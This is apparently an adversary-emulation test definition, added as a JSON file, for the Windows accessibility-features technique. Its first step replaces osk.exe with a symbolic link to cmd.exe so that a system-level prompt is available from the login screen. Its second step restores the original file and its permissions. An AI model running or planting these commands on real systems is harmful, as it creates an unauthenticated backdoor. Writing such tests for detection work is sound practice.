@@ -1,0 +1,44 @@
+{
+  "id": "51ef369c-5e87-4f33-88cd-6d61be63edf2",
+  "name": "Create Symbolic Link From osk.exe to cmd.exe",
+  "description": "Replace accessiblity executable with cmd.exe to provide elevated command prompt from login screen without logging in.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "8a2b20a7-d8d8-4ad8-a36c-4a31797e60f8",
+      "type": "execute-command",
+      "data": {
+        "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "81c24b76-53c7-4312-8721-e0ae65b81e31",
+      "type": "execute-command",
+      "data": {
+        "command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "8a2b20a7-d8d8-4ad8-a36c-4a31797e60f8",
+      "p": "on-success",
+      "o": "81c24b76-53c7-4312-8721-e0ae65b81e31"
+    },
+    {
+      "s": "8a2b20a7-d8d8-4ad8-a36c-4a31797e60f8",
+      "p": "on-failure",
+      "o": "81c24b76-53c7-4312-8721-e0ae65b81e31"
+    }
+  ],
+  "tags": [
+    "T1546.008",
+    "atomic-red-team"
+  ]
+}
